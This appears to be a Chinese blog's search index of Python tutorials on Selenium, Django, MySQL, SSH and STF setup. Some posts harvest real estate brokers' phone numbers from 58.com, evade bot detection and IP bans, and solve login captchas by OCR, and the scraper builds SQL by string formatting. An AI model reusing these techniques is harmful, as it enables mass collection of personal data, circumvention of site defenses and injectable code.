根据提示信息，在python安装路径找到pipreqs.py文件，第74行（pipreqs不同版本行数可能不一样），将encoding设置为&#39;utf-8&#39;，然后再执行就不会报错。","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"使用selenium做自动化和爬虫时的几个常用设置","slug":"selenium爬虫的几个常用设置","date":"2019-07-18T04:00:00.000Z","updated":"2019-10-08T13:32:23.695Z","comments":true,"path":"2019/07/18/selenium爬虫的几个常用设置/","link":"","permalink":"http://yoursite.com/2019/07/18/selenium%E7%88%AC%E8%99%AB%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.wait import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport timeurl = 'http://www.xxxxx.com/login.html'chrome_options = webdriver.ChromeOptions()# 设置为开发者模式访问，防止被网站识别出来是seleniumchrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])# 设置浏览器不加载图片，从而加快页面加载速度prefs = &#123;\"profile.managed_default_content_settings.images\": 2&#125;chrome_options.add_experimental_option(\"prefs\", prefs)# 添加代理chrome_options.add_argument('--proxy-server=http://101.37.79.125:3128') #添加代理# 达到目标后停止加载capa = DesiredCapabilities.CHROMEcapa[\"pageLoadStrategy\"] = \"none\" #懒加载模式，不等待页面加载完毕# 设置日志等级chrome_options.add_argument('log-level=3') # INFO = 0 WARNING = 1 LOG_ERROR = 2 LOG_FATAL = 3 default is 0# chrome-headerless模式chrome_options.add_argument('--headless')# 手机模式打开浏览器mobile_emulation = &#123;'deviceName': 'iPhone 6'&#125;chrome_options.add_experimental_option(\"mobileEmulation\", mobile_emulation)# 启动chrome浏览器driver = webdriver.Chrome(chrome_options=chrome_options,desired_capabilities=capa) #desired_capabilities参数就是上面设置的，如果没有设置就不加driver.get(url)cookies = driver.get_cookies()","categories":[{"name":"自动化","slug":"自动化","permalink":"http://yoursite.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"}]},{"title":"Django2.0在models创建数据表时报错","slug":"django2.0创建新表报错","date":"2019-07-09T12:00:00.000Z","updated":"2019-07-09T12:38:39.328Z","comments":true,"path":"2019/07/09/django2.0创建新表报错/","link":"","permalink":"http://yoursite.com/2019/07/09/django2.0%E5%88%9B%E5%BB%BA%E6%96%B0%E8%A1%A8%E6%8A%A5%E9%94%99/","excerpt":"","text":"Django2.0在models创建数据表时报错TypeError: __init__() missing 1 required positional argument: &#39;on_delete&#39; 如下创建了两个表，Tag 表以 Contact 表为外部键，此时可以看到pycharm控制台报错 123456789101112131415class Contact(models.Model): name = models.CharField(max_length=200) age = models.IntegerField(default=0) email = models.EmailField() def __unicode__(self): return self.nameclass Tag(models.Model): contact = models.ForeignKey(Contact) # on_delete=models.DO_NOTHING name = models.CharField(max_length=50) def __unicode__(self): return self.name 这是由于Django2.0之后定义外键需要加上on_delete参数, 此参数是为了避免两个表里面数据不一致的问题，2.0之前的版本on_delete参数有个默认值models.CASCADE，2.0及之后不再默认，不手动加上的话会报错。如下添加on_delete = models.CASCADE 或者 on_delete = models.DO_NOTHING 即可。 123456789101112131415class Contact(models.Model): name = models.CharField(max_length=200) age = models.IntegerField(default=0) email = models.EmailField() def __unicode__(self): return self.nameclass Tag(models.Model): contact = models.ForeignKey(Contact,on_delete=models.DO_NOTHING) # 设置on_delete参数 name = models.CharField(max_length=50) def __unicode__(self): return self.name","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"}]},{"title":"python3环境下django使用MySQL数据库","slug":"python3环境下django使用MySQL数据库","date":"2019-07-08T04:00:00.000Z","updated":"2019-07-09T11:46:27.162Z","comments":true,"path":"2019/07/08/python3环境下django使用MySQL数据库/","link":"","permalink":"http://yoursite.com/2019/07/08/python3%E7%8E%AF%E5%A2%83%E4%B8%8Bdjango%E4%BD%BF%E7%94%A8MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"安装PyMySQL1pip install PyMySQL 修改settings.py文件将Django创建项目时自带的数据库配置注释掉，添加MySQL配置如下 12345678910111213141516171819# 注释掉Django自带的数据库配置# DATABASES = &#123;# 'default': &#123;# 'ENGINE': 'django.db.backends.sqlite3',# 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),# &#125;# &#125;# 使用mysql配置DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', # 固定格式 'NAME': 'testDB', # 数据库名称 'USER': 'root', # 连接用户名 'PASSWORD': '密码', # 连接密码 'HOST':'127.0.0.1', # 连接IP 'PORT':'3306', # 连接端扣 &#125;&#125; 修改__init__.py文件创建Django项目时，项目目录下，也就是settings.py所在的目录下，会有一个__init__.py文件，没有的话手动创建，在文件中添加如下。 12import pymysqlpymysql.install_as_MySQLdb()","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"python命令行传递参数","slug":"python命令行传递参数","date":"2019-05-21T12:00:00.000Z","updated":"2019-10-08T13:32:40.900Z","comments":true,"path":"2019/05/21/python命令行传递参数/","link":"","permalink":"http://yoursite.com/2019/05/21/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/","excerpt":"","text":"使用sys模块 12345import sysargs = list(sys.argv) #将命令行传的参数弄在列表中print(args) #打印命令行中的参数print(type(args)) 例如在CMD命令行中输入以下命令 1python baidu.py 回锅肉 结果为 12[&#39;baidu.py&#39;,&#39;回锅肉&#39;]&lt;class &#39;list&#39;&gt; 即python后面的两个参数都打印出来，是个列表，就可以在代码中将列表的参数取出来带入需要的函数中","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"}]},{"title":"selenium爬取58同城手机号","slug":"selenium爬取58同城手机号","date":"2019-01-10T12:00:00.000Z","updated":"2019-01-14T09:44:46.034Z","comments":true,"path":"2019/01/10/selenium爬取58同城手机号/","link":"","permalink":"http://yoursite.com/2019/01/10/selenium%E7%88%AC%E5%8F%9658%E5%90%8C%E5%9F%8E%E6%89%8B%E6%9C%BA%E5%8F%B7/","excerpt":"","text":"以二手房板块为例，抓取二手房源信息和经纪人的联系电话。首先抓取所有房源详情链接，再访问每个链接抓取房源详情保存到数据库。 一、获取列表页所有二手房源详情链接重庆地区共70页，解析每页的房源详情地址并保存到本地。 1234567891011121314151617181920212223242526import requests,lxml,timefrom bs4 import BeautifulSoupdef get_all_link(): ''' 58同城重庆地区【房产板块 - 二手房】的房源详情地址 ''' for i in range(1,71): url = 'https://cq.58.com/ershoufang/pn%d/' %i #房源列表页 web_data = requests.get(url) soup = BeautifulSoup(web_data.text,'lxml') fang_links = soup.select('body &gt; div.main-wrap &gt; div.content-wrap &gt; div.content-side-left &gt; ul &gt; li &gt; div.list-info &gt; h2 &gt; a') for fang_link in fang_links: fang_link = fang_link.get('href') #a标签的href属性值就是需要的房源详情页的URL print(fang_link) if fang_link.startswith('//') == True: #判断是否是//开头的链接，是的话直接跳过，这种selenium无法直接通过url进入 print('URL不符合规则，跳过') continue else: pass with open(r\"C:\\Users\\Administrator\\Desktop\\58_ershoufang_link.txt\",'a+') as f: f.write(fang_link + '\\n') #写入本地txt文件 f.close() print('第%d页抓取完毕'%i,' ') print('共%d条'%(len(fang_links))) time.sleep(1) #每页抓取完毕等待1秒，防止IP被限制 二、分析并抓取详情页面1.基本信息右键检查元素，标题，户型，面积，朝向等都比较简单的容易获取到，直接用requests获取源码，然后BeautifulSoup解析即可。 2.获取售价但是总价和每平米售价却是乱码的，这是由于58有一套自定义的字体在在这里替换页面中的数字，而且每次刷新都是随机，要获取到真实的价钱，首先要解析58的自定义字体与数字0-9的一一对应关系，再讲抓取到的自定义字体替换为对应的数字，后面专门写一篇文章介绍。 浏览网页结构发现，header标签下的第二个meta标签有一些简介描述，其中就包含了总价和每平米售价，我们将这个标签的内容抓取下来取出其中的数字即可，免去了解析58自定义字体的麻烦。 3.获取手机号手机号码不是直接展示在页面，需要手动点击”电话联系TA”才能显示，打开控制台可以看到，点击按钮后发送了两个JS请求，第二个请求返回的json值就包含了手机号，第一想法就是通过python的requests直接模拟这个请求来获取手机号，但是仔细观察发现这个GET请求的参数是加密的，要猜解字段有点难度，而且调试过程中发现直接请求接口速度太快会被频繁封IP，本着化繁为简的原则，直接使用selenium控制浏览器模拟点击这个按钮后，获取点击后的网页源码，再解析html中的手机号。 4.代码实例因为要点击查看手机号，所以不再使用requests获取网页源码，使用selenium + chromedriver获取网页源码，抓取到的信息写入数据库，前提是下载本机chrome浏览器对应的chromedriver驱动放在python可执行路径下。 1234567891011121314151617181920212223242526272829import pymysqldef write_sql(sql): ''' 将抓取的数据写入mydql数据库 ''' try: db = pymysql.Connect(host='localhost',port=3306,user='root',password='123456',db='58_ershoufang') except: print('数据库链接失败') pass # 使用cursor()方法获取操作游标 cursor = db.cursor() # SQL 插入语句 try: # 执行sql语句 cursor.execute(\"set names 'utf8'\") #中文写入失败的时候加上这句 cursor.execute(sql.encode('utf8')) # cursor.execute(sql) # 提交到数据库执行 db.commit() except Exception as e: print(e) # 如果发生错误则回滚 db.rollback() # 关闭数据库连接 db.close() 抓取房源详情1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from selenium.webdriver.chrome.options import Optionsfrom selenium import webdriverimport requests,lxml,timefrom bs4 import BeautifulSoupimport pymysqldef get_detail_info(): ''' 依次从上一个函数中保存的所有房源地址进入详情页面，获取房产详细信息 ''' chrome_options = webdriver.ChromeOptions() prefs = &#123;\"profile.managed_default_content_settings.images\": 2&#125; #设置浏览器不加载图片，从而加快页面加载速度 chrome_options.add_experimental_option(\"prefs\", prefs) chrome_options.add_argument('--headless') #chrome-headerless模式 driver = webdriver.Chrome(chrome_options=chrome_options) #启动chrome浏览器 with open(r\"C:\\Users\\Administrator\\Desktop\\58_ershoufang_link.txt\",'r') as f: lines = f.readlines() for line in lines: house_info = [] driver.get(line) time.sleep(0.5) print(lines.index(line)+1) html = driver.page_source #获取网页源码 if \"你要找的页面不在这个星球上！\" in html: print('该房源已经下架') print('=' * 50) continue else: driver.find_element_by_css_selector('#houseChatEntry &gt; div &gt; p.chat-phone-layer.show-phone').click() # 点击查看手机号 time.sleep(0.3) soup = BeautifulSoup(driver.page_source,'lxml') #BeautifulSoup解析 #页面header &gt; meta标签中有一些描述信息,包括售价 description = soup.select('head &gt; meta:nth-of-type(2)')[0].get('content').split(\";\") #从描述信息字符串中截取房源标题，总售价，每平米售价 title = description[0] #房源标题 price_all = description[1].split('：')[1].split('元（')[0] #总售价 price_per = description[1].split('：')[1].split('元（')[1].split('）')[0] #每平米售价 #select方法在页面结构中选择其余需要抓取的字段，有些字段不是每个房源信息都有的，不存在的时候直接设置为空 house_xiaoqu = soup.select('body &gt; div.main-wrap &gt; div.house-basic-info.clearfix &gt; div.house-basic-right.fr &gt; ul &gt; li:nth-of-type(1) &gt; span.c_000.mr_10') #所在小区 house_xiaoqu = ' - '.join(i.text.strip().replace('\\n','').replace(' ','').replace('-','') for i in house_xiaoqu) #整理小区格式 house_address = soup.select('body &gt; div.main-wrap &gt; div.house-basic-info.clearfix &gt; div.house-basic-right.fr &gt; ul &gt; li:nth-of-type(2) &gt; span.c_000.mr_10') #所在地址 house_address = ' - '.join(i.text.strip().replace('\\n','').replace(' ','').replace('-','') for i in house_address) #整理地址格式 try: broker_name = soup.select('div.agent-name.agent-little.f14.c_555 &gt; a')[0].text.strip() #经纪人名称 except: broker_name = '' #经纪人名称不存在的话赋值为空 broker_phone = soup.select('#houseChatEntry &gt; div &gt; p.phone-num')[0].text.strip() #经纪人电话 house_huxing = soup.select('#generalSituation &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(2) &gt; span.c_000')[0].text.strip() #房屋户型 house_size = soup.select('#generalSituation &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(3) &gt; span.c_000')[0].text.strip() # 房屋面积 house_direction = soup.select('#generalSituation &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(4) &gt; span.c_000')[0].text.strip() #房屋朝向 house_floor = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(1) &gt; span.c_000')[0].text.strip() #所在楼层 house_fitment = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(2) &gt; span.c_000')[0].text.strip() #装修情况 house_age_limit = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(3) &gt; span.c_000')[0].text.strip() #房产年限 house_build_year = soup.select('#generalSituation &gt; div &gt; ul.general-item-right &gt; li:nth-of-type(4) &gt; span.c_000')[0].text.strip() #建造时间 house_type = soup.select('#generalExpense &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(2) &gt; span.c_000')[0].text #房屋类型 jiaoyiquanshu = soup.select('#generalExpense &gt; div &gt; ul.general-item-left &gt; li:nth-of-type(3) &gt; span.c_000')[0].text #交易权属 hexinmaidian = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(1) &gt; p')[0].text #核心卖点 yezhuxintai = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(2) &gt; p')[0].text.strip() #业主心态 fuwujieshao = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(3) &gt; p')[0].text.strip() #服务介绍 try: fangyuanbianhao = soup.select('#generalDesc &gt; div &gt; div:nth-of-type(4) &gt; p')[0].text.strip().split('：')[1] #房源编号 except: fangyuanbianhao = '' #房源编号不存在的话赋值为空 #所有字段存放在列表方便打印查看 house_info = [title,price_all,price_per,house_xiaoqu,house_address,broker_name,broker_phone,house_huxing,house_size,house_direction,house_floor,house_fitment,house_age_limit,house_build_year,house_type,jiaoyiquanshu,hexinmaidian,yezhuxintai,fuwujieshao,fangyuanbianhao] #sql插入语句 sql = \"\"\"INSERT INTO `58_ershoufang`.`fang` (`title`, \\ `price_all`, `price_per`, `house_xiaoqu`, `house_address`, `broker_name`, `broker_phone`, `house_huxing`, `house_size`, `house_direction`, `house_floor`, `house_fitment`, `house_age_limit`, `house_build_year`, `house_type`, `jiaoyiquanshu`, `hexinmaidian`, `yezhuxintai`, `fuwujieshao`, `fangyuanbianhao`) \\ VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s');\"\"\" % \\ (title,price_all,price_per,house_xiaoqu,house_address,broker_name,broker_phone,house_huxing,house_size,house_direction,house_floor,house_fitment,house_age_limit,house_build_year,house_type,jiaoyiquanshu,hexinmaidian,yezhuxintai,fuwujieshao,fangyuanbianhao) write_sql(sql) #写入mysql的函数","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"},{"name":"UI自动化","slug":"UI自动化","permalink":"http://yoursite.com/tags/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"通过百度云ORC解决UI自动化测试中的简单验证码问题","slug":"通过百度云ORC解决UI自动化测试中的简单验证码问题","date":"2018-12-19T04:00:00.000Z","updated":"2018-12-19T02:46:47.226Z","comments":true,"path":"2018/12/19/通过百度云ORC解决UI自动化测试中的简单验证码问题/","link":"","permalink":"http://yoursite.com/2018/12/19/%E9%80%9A%E8%BF%87%E7%99%BE%E5%BA%A6%E4%BA%91ORC%E8%A7%A3%E5%86%B3UI%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E7%AE%80%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"前言在selenium做自动化测试的时候经常会遇到验证码的问题，之前通过Tesseract-OCR软件结合python的pytesseract库来处理，然而在实际使用过程中识别效果并不是特别理想，需要手动训练自己的验证来提高识别率，却又经常遇到环境方面的问题导致障碍颇多，目前比较火的方法是通过大数据机器学习、人工智能来更好的训练，例如tensorflow框架等。当然时间有限的话还可以使用市场上已经成熟的图片/文字识别服务等，本文主要介绍百度云人工智能的文字识别服务。 一、环境准备1.在百度云新建应用使用自己的百度账号登陆百度云，进入控制台后，依次点击左侧的’总览’ - ‘产品服务’ - ‘人工智能’ - ‘文字识别’，进入如下页面 点击创建应用，应用名称和应用描述为必填，其他的根据自己的需要选择即可，我这里全部按照默认选择不去修改。 创建完成后在应用管理里面能看到刚刚新创建的内容如下图，AppID，API Key，Secret Key三个字段后面要用到。 2.安装 baidu-aip 库1pip install baidu-aip 二、简单DEMO1.首先需要导入aip库的AipOcr方法：1from aip import AipOcr 2.然后验证百度账号：1234APP_ID = '1*******9'API_KEY = 'q*****************5'SECRET_KEY = 'q**************g'client = AipOcr(APP_ID, API_KEY, SECRET_KEY) AppID，API Key，Secret Key分别是第一步环境准备中获取的三个字段。 3.人工智能识别验证码 1234567#打开本地本地验证码with open(r'C:\\Users\\Administrator\\Desktop\\验证码.jpg', 'rb') as fp: yanzhengma = fp.read()#使用client.basicAccurate()或者client.basicGeneral()方法自动识别验证码a = client.basicAccurate(yanzhengma)print(a) client.basicAccurate() –&gt; 文字识别高精度版本，每天免费500次请求。client.basicGeneral() –&gt; 文字识别普通精度版本，每天免费50000次请求。 此时打印出来的a是一个字典如下： 1&#123;&#39;log_id&#39;: 204739743393514642, &#39;words_result_num&#39;: 1, &#39;words_result&#39;: [&#123;&#39;words&#39;: &#39; r:e52&#39;&#125;]&#125; 我们只需要字典中的验证码： 12yzm_result = a['words_result'][0]['words']print(yzm_result) 1r:e52 使用的高精度识别版本，仍然偶尔会识别错误，例如上面这个例子，验证码前面多了个空格，第一个字母r后面多了个冒号，我们手动将这些不需要的字符替换为空即可。 12yzm_result = a['words_result'][0]['words'].strip().replace(' ','').replace('.','').replace(':','').replace('\\'','') return yzm_result 在我的测试使用中发现，对于这种级别的图片验证码高精度识别的话只是偶尔会出现错误，总体上还是很准确的，不用过多担心百度云的识别精度，实际应用到业务中可以放到循环里面，验证码识别失败重新识别即可。 4.将上面步骤写入到一个方法方便调用：1234567891011121314def yzm(yanzhengma_path): ''' 识别登陆验证码 ''' APP_ID = '1*******9' API_KEY = 'q*****************5' SECRET_KEY = 'q**************g' client = AipOcr(APP_ID, API_KEY, SECRET_KEY) with open(yanzhengma_path, 'rb') as fp: yanzhengma = fp.read() a = client.basicAccurate(yanzhengma) #basicAccurate basicGeneral yzm_result = a['words_result'][0]['words'].strip().replace(' ','').replace('.','').replace(':','').replace('\\'','') print('登陆验证码：' + yzm_result) return yzm_result 三、登陆场景主要实现过程： 先把登陆页面的验证码保存到本地 然后通过百度云识别出结果 将结果填写到验证码输入框 点击登陆并判断验证码是否正确，不正确的话返回第一步重新获取并识别 直接通过代码的注释来解释每一步： 12345678910111213141516171819202122232425262728293031from selenium import webdriverfrom aip import AipOcrimport timeyanzhengma_path = 'C:/Users/Administrator/Desktop/' #验证码存放的本地路径def login(): driver = webdriver.Chrome() #启动浏览器 driver.get('https://www.****.com/login.html') #进入登陆页面 driver.maximize_window() #窗口最大化 driver.find_element_by_css_selector('#loginName').send_keys('username') #输入登陆用户名 time.sleep(0.5) driver.find_element_by_css_selector('#passWord').send_keys('password') #输入登陆密码 time.sleep(0.5) n = 1 while True: driver.find_element_by_id('randompicture').screenshot(yanzhengma_path + '验证码.jpg') #将登陆验证码截图保存在本地 yzm_result = yzm(yanzhengma_path + '验证码.jpg') # 自动识别验证码，调用上一步写好的验证码识别函数yzm() driver.find_element_by_id('radompicture').send_keys(yzm_result) #填写识别后的验证码 time.sleep(0.5) driver.find_element_by_css_selector(\"#loginForm &gt; div &gt; div.login_btn &gt; a\").click() # 点击\"登陆\"按钮 time.sleep(1) try: #这里判断登陆失败的提示信息是否存在,根据自己的实际业务来判断即可 is_element_exist = driver.find_element_by_id('selectShopName') if is_element_exist.text == '验证码不正确！': #判断登陆失败提示信息是否是\"验证码不正确！\"，是则说明验证码识别错误，重新获取验证码并识别 print('验证码不正确，正在第%d次重新登陆' % n) n += 1 else: break except: #登陆失败的提示信息元素不存在则说明登陆成功，跳出循环 print('登陆成功') break 百度云文字识别还有更多强大的功能，例如身份证、车牌、营业执照识别等，详细介绍和收费标准参考【官方文档】。","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"},{"name":"UI自动化","slug":"UI自动化","permalink":"http://yoursite.com/tags/UI%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"验证码","slug":"验证码","permalink":"http://yoursite.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"}]},{"title":"Windows下python3登陆和操作linux服务器","slug":"Windows下python3登陆和操作linux服务器","date":"2018-10-16T04:00:00.000Z","updated":"2019-03-20T11:02:52.866Z","comments":true,"path":"2018/10/16/Windows下python3登陆和操作linux服务器/","link":"","permalink":"http://yoursite.com/2018/10/16/Windows%E4%B8%8Bpython3%E7%99%BB%E9%99%86%E5%92%8C%E6%93%8D%E4%BD%9Clinux%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"一、环境准备python3远程连接需要用到pycrytodome和paramiko库，其中后者依赖前者，所以按照顺序来安装 1. 安装pycrytodome1pip install pycrytodome 2. 安装paramiko上一步安装完毕后直接pip安装paramiko即可 1pip install paramiko 8777777-================= 二、简单DEMO1234567891011import paramikodef py_ssh(): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(\"192.168.1.1\",22,\"root\",\"123456\") #四个参数分别是远程连接的IP，端口，登录名，密码 cmd = \"cat /opt/tomcats/tomcat-8082/logs/catalina.out | grep 17600000000 | grep 验证码\" stdin,stdout,stderr = ssh.exec_command(cmd) a = stdout.readlines() #查询结果是个列表，每一个元素代表查询结果的一行 print(a) ssh.close() 上面例子就是连接这台Linux机器后查询catalina.out文件中包含手机号和验证码的行。 三、可能遇到的问题如果出现如下报错：ModuleNotFoundError: No module named &#39;_cffi_backend&#39; 确认cryptography和cffi库已经安装，如果这两个已经装了还是报这个错把这两个库卸载了重新安装","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"requests简单获取cookie","slug":"requests获取请求和返回的cookie","date":"2018-10-16T04:00:00.000Z","updated":"2018-12-17T02:30:56.811Z","comments":true,"path":"2018/10/16/requests获取请求和返回的cookie/","link":"","permalink":"http://yoursite.com/2018/10/16/requests%E8%8E%B7%E5%8F%96%E8%AF%B7%E6%B1%82%E5%92%8C%E8%BF%94%E5%9B%9E%E7%9A%84cookie/","excerpt":"","text":"一般在单个脚本文件中用requests.session()就可以自动处理多个请求之间的cookie，但是有时候需要将第一次请求后的cookie获取到单独保存出来跨文件跨脚本使用，此时直接用.cookies方法只能获取到response headers中的cookie，而请求之后request headers中的cookie则需要用以下方法。 DEMO12345import requestsr = requests.post(url,data=data)print(r.cookies) #获取response headers中的cookieprint(r.request._cookies._cookies) #获取request headers中的cookie 以上时最简单的方法，更详细的操作可以使用python的cookielib库。","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"requests","slug":"requests","permalink":"http://yoursite.com/tags/requests/"}]},{"title":"centos 7 安装STF环境","slug":"centos 7安装STF环境","date":"2018-10-11T04:00:00.000Z","updated":"2018-12-17T02:30:56.869Z","comments":true,"path":"2018/10/11/centos 7安装STF环境/","link":"","permalink":"http://yoursite.com/2018/10/11/centos%207%E5%AE%89%E8%A3%85STF%E7%8E%AF%E5%A2%83/","excerpt":"","text":"前言因为自己的办公电脑是Windows，之前一直尝试在Windows安装STF环境，但是坑比较多，尝试多次无法解决，最终在虚拟机中的centos系统成功安装STF，虽然是虚拟机但实际使用中效率并没有很大影响，本文介绍一下在centos7安装STF的过程，参考了一些教程，将安装过程中遇到的各种问题做总结。 一、基础准备1. VMware Workstation 14 （如果是Linux真机，忽略这一步）建议使用VMware Workstation 14及以上版本，我刚开始使用的是12版本，但是系统安装完成后一直无法识别移动USB设备，也就是我的手机，换成14版本则没有这个问题。具体表现如下，手机已经连接上了虚拟机，但是centos中使用lsusb 和 adb devices命令都无法检测到这台手机： 虚拟机安装centos时，USB兼容性选择USB 3.0，网络连接选择桥接模式 2. centos 7centos6.x安装时候依赖关系不好整理，建议直接下载标准版centos7，安装时不要选择最小安装模式，服务器模式或者桌面模式即可，这样java环境等都会自动集成进去不用再手动配置。 3. 安卓手机 开启开发者选项 开启USB调试 开启USB安装（STF要在手机上安装一个STF服务，不开启此选项会导致安装失败，也就无法通过STF操作手机） 4. 功能正常的USB线5. 连接手机（如果是Linux真机，忽略这一步）将手机通过USB连接电脑，同时在虚拟可移动设备中连接此手机 若果上图中没有”可移动设备”的选项，是因为虚拟机的USB服务没有开启，开启方法如下：win + R键打开输入窗口，输入services.msc按回车，打开服务列表，找到VMware USB Arbitration Service，双击进入编辑页面，点击启动。 二、环境安装1.基本命令安装安装wget、zip、unzip等命令 12yum install wgetyum install -y unzip zip 2.java环境配置(安装的标准版centos7可忽略这一步，系统已自带java1.8)首先下载jdk 12345cd /usr/localmkdir javacd javawget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.rpm\"rpm -ivh jdk-8u151-linux-x64.rpm 配置环境变量 1vi /etc/profile 在文件中增加如下内容： 123export JAVA_HOME=/usr/java/jdk1.8.0_151export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 验证环境是否ok： 1java -version 3.android SDK环境配置首先下载SDK 12345cd /usr/localmkdir androidcd androidwget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zipunzip sdk-tools-linux-3859397.zip 配置环境变量 1vi /etc/profile 在文件中增加如下内容： 1export PATH=$PATH:/usr/local/android/tools/bin 然后执行 1source profile 安装platform-tools 1sdkmanager \"platform-tools\" 配置环境变量 1vi /etc/profile 在文件中增加如下内容： 1export PATH=$PATH:/usr/local/android/platform-tools 执行 1source profile 查看已安装信息 1sdkmanager --list 验证环境是否ok： 1adb --version 检查手机是否连接成功： 1adb devices 我链接了两个手机，可以看到结果中有两条设备，设备号后面的状态是device证明设备正常可操作，如果不是此状态，而是unauthorized,offline等，检查一下手机是否连接好电脑，并且开启了USB调试。 4.node安装依次执行： 1234567cd /usr/localmkdir node cd nodewget https://nodejs.org/download/release/v9.0.0/node-v9.0.0-linux-x64.tar.gztar xvf node-v9.0.0-linux-x64.tar.gzln -s /usr/local/node/node-v9.0.0-linux-x64/bin/node /usr/local/bin/nodeln -s /usr/local/node/node-v9.0.0-linux-x64/bin/npm /usr/local/bin/npm 检查环境 12node -vnpm -v 建议安装cnpm,后面直接用npm安装STF速度很慢甚至失败，使用国内的镜像速度要快很多 1npm install -g cnpm --registry=https://registry.npm.taobao.org 检查cnpm是否安装OK 1cnpm -v 若提示cnpm命令不存在，是因为没有给cnpm执行程序配置环境变量，执行以下命令创建软链接即可，在系统任何地方就都能使用cnpm 1ln -s /usr/local/node/node-v9.0.0-linux-x64/bin/cnpm /usr/local/bin/ 5.rethinkdb安装依次执行: 123cd /opt/dong -----即在opt新建一个目录用来用来其他依赖wget http://download.rethinkdb.com/centos/7/`uname -m`/rethinkdb.repo -O /etc/yum.repos.d/rethinkdb.repoyum install rethinkdb 检查环境是否ok: 1rethinkdb -v 启动rethinkdb直接在命令行输入rethinkdb并回车即可开启 1rethinkdb 也可以将它放入后台执行 1rethinkdb &amp; 6.GraphicsMagick安装依次执行： 1234567cd /opt/dongwget https://iweb.dl.sourceforge.net/project/graphicsmagick/graphicsmagick/1.3.26/GraphicsMagick-1.3.26.tar.gztar xvf GraphicsMagick-1.3.26.tar.gzcd GraphicsMagick-1.3.26./configuremakemake install 验证环境是否ok: 1gm 7.yasm安装依次执行： 1234567cd /opt/dongwget 